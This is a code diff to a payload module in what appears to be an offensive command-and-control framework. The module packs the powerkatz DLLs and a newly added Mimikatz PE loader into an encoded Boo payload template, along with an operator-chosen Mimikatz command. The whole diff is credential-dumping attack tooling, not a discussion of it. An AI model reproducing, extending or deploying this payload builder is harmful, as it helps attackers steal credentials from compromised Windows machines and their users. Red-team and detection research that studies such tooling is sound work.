@@ -20,9 +20,11 @@ class STModule(Module):
     def payload(self):
         with open('core/teamserver/data/powerkatz_x86.dll', 'rb') as powerkatz_x86:
             with open('core/teamserver/data/powerkatz_x64.dll', 'rb') as powerkatz_x64:
-                with open('core/teamserver/modules/boo/src/mimikatz.boo', 'r') as module_src:
-                    src = module_src.read()
-                    src = src.replace("COMPRESSED_PE_x86", dotnet_deflate_and_encode(powerkatz_x86.read()))
-                    src = src.replace("COMPRESSED_PE_x64", dotnet_deflate_and_encode(powerkatz_x64.read()))
-                    src = src.replace("MIMIKATZ_COMMAND", self.options['Command']['Value'])
-                    return src
+                with open('core/teamserver/data/mimikatz_peloader.dll', 'rb') as peloader:
+                    with open('core/teamserver/modules/boo/src/mimikatz.boo') as module_src:
+                        src = module_src.read()
+                        src = src.replace("COMPRESSED_PE_x86", dotnet_deflate_and_encode(powerkatz_x86.read()))
+                        src = src.replace("COMPRESSED_PE_x64", dotnet_deflate_and_encode(powerkatz_x64.read()))
+                        src = src.replace("MIMI_PE_LOADER", dotnet_deflate_and_encode(peloader.read()))
+                        src = src.replace("MIMIKATZ_COMMAND", self.options['Command']['Value'])
+                        return src
